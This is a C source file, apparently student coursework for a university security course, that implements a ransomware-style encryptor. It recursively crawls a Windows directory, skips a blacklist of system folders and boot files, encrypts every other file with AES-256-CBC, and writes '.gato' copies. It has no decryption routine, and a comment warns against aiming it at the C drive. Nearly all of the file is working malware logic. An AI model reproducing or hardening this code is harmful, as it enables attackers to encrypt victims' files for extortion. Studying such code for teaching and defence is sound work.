// this was written by casey g. for CNIT 315 @ Purdue Polytechnic Institute
// with love!
// note: there is no decryption function, so unless you're writing one, DON'T change the
// basePath to C:\\ and run this, please

#include <stdio.h>
#include <stdlib.h>
#include <dirent.h>
#include <sys/stat.h>
#include <string.h>
#include <windows.h>
#include <stdbool.h>
#include <openssl/evp.h>
#include <openssl/rand.h>
#define BUFFER_SIZE 1024

const char* blackFolders[] = { 
        "ProgramData", "$recycle.bin", "Program Files", "Windows", "All Users", 
        "winnt", "AppData", "Application Data", "Local Settings", "Boot",
};
const char* blackFiles[] = { // todo: add a clause about already-encrypted files
        "ntldr", "pagefile.sys", "ntdetect.com", "autoexec.bat", 
        "desktop.ini", "autorun.inf", "ntuser.dat", "iconcache.db", "bootsect.bak", 
        "boot.ini", "bootfont.bin", "config.sys", "io.sys", "msdos.sys", "ntuser.dat.log", 
        "thumbs.db", "swapfile.sys" };

int encryptFile(const char *inputFile, const char *outputFile) {
    FILE *inFile = fopen(inputFile, "rb");
    if (!inFile) {
        perror("Error opening input file");
        return 1;
    }

    FILE *outFile = fopen(outputFile, "wb+"); 
    if (!outFile) {
        perror("Error opening output file");
        fclose(inFile);
        return 1;
    }

    // generate key + IV
    unsigned char key[EVP_MAX_KEY_LENGTH];
    unsigned char iv[EVP_MAX_IV_LENGTH];
    if (RAND_bytes(key, EVP_MAX_KEY_LENGTH) != 1 || RAND_bytes(iv, EVP_MAX_IV_LENGTH) != 1) {
        perror("Error generating random bytes");
        fclose(inFile);
        fclose(outFile);
        return 1;
    }

    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
    if (!ctx) {
        perror("Error creating cipher context");
        fclose(inFile);
        fclose(outFile);
        return 1;
    }

    // initialize encryption
    if (EVP_EncryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, key, iv) != 1) {
        perror("Error initializing encryption");
        EVP_CIPHER_CTX_free(ctx);
        fclose(inFile);
        fclose(outFile);
        return 1;
    }

    unsigned char inBuffer[BUFFER_SIZE];
    unsigned char *outBuffer = malloc(BUFFER_SIZE + EVP_CIPHER_CTX_block_size(ctx));
    if (!outBuffer) {
        perror("Error allocating memory");
        EVP_CIPHER_CTX_free(ctx);
        fclose(inFile);
        fclose(outFile);
        return 1;
    }
    int bytesRead, bytesEncrypted;

    // encrypt input file, write to encrypted file
    while ((bytesRead = fread(inBuffer, 1, BUFFER_SIZE, inFile)) > 0) {
        if (EVP_EncryptUpdate(ctx, outBuffer, &bytesEncrypted, inBuffer, bytesRead) != 1) {
            perror("Error encrypting data");
            EVP_CIPHER_CTX_free(ctx);
            fclose(inFile);
            fclose(outFile);
            return 1;
        }
        fwrite(outBuffer, 1, bytesEncrypted, outFile);
    }

    // finalize encryption
    if (EVP_EncryptFinal_ex(ctx, outBuffer, &bytesEncrypted) != 1) {
        perror("Error finalizing encryption");
        EVP_CIPHER_CTX_free(ctx);
        fclose(inFile);
        fclose(outFile);
        return 1;
    }
    fwrite(outBuffer, 1, bytesEncrypted, outFile);

    // write key + IV to beginning of output file
    fseek(outFile, 0, SEEK_SET);
    fwrite(key, 1, EVP_CIPHER_CTX_key_length(ctx), outFile);
    fwrite(iv, 1, EVP_CIPHER_CTX_iv_length(ctx), outFile);

    EVP_CIPHER_CTX_free(ctx);
    fclose(inFile);
    fclose(outFile);
    free(outBuffer);
    return 0;
}

// check for blacklist
bool isBlacklisted(char *name) {
    for (size_t i = 0; i < sizeof(blackFolders) / sizeof(blackFolders[0]); ++i) {
        if (strcmp(name, blackFolders[i]) == 0) {
            return true;
        }
    }
    for (size_t i = 0; i < sizeof(blackFiles) / sizeof(blackFiles[0]); ++i) {
        if (strcmp(name, blackFiles[i]) == 0) {
            return true;
        }
    }
    return false;
}

// "listFiles" is artifact from harmless tests, but this spiders the filesystem with dirent.h
void listFilesRecursively(char *basePath) {
    struct dirent *dp;
    struct stat statbuf;
    DIR *dir = opendir(basePath);

    if (!dir) {
        return;
    }

    while ((dp = readdir(dir)) != NULL) {
        char encryptedFile[BUFFER_SIZE]; 
        char path[BUFFER_SIZE];
        char outPath[BUFFER_SIZE];
        if (strcmp(dp->d_name, ".") != 0 && strcmp(dp->d_name, "..") != 0) {
            sprintf(path, "%s/%s", basePath, dp->d_name);
            if (stat(path, &statbuf) != -1) {
                if (S_ISDIR(statbuf.st_mode)) {
                    if (!isBlacklisted(dp->d_name)) {
                        listFilesRecursively(path);
                    }
                } else {
                    if (!isBlacklisted(dp->d_name)) {
                        strcpy(encryptedFile, dp->d_name);
                        strcat(encryptedFile, ".gato");
                        strcpy(outPath, path);
                        strcat(outPath, encryptedFile);
                        encryptFile(path, outPath);
                        printf("%s ", dp->d_name);
                        printf("was encrypted, is now %s\n", encryptedFile);
                    }
                }
            }
        }
    }

    closedir(dir);
}

// very, very small main function
int main() {

    char *basePath = "C:\\Users\\aguka\\OneDrive\\Desktop\\TESTFOLDER";
    listFilesRecursively(basePath);

    return 0;
}
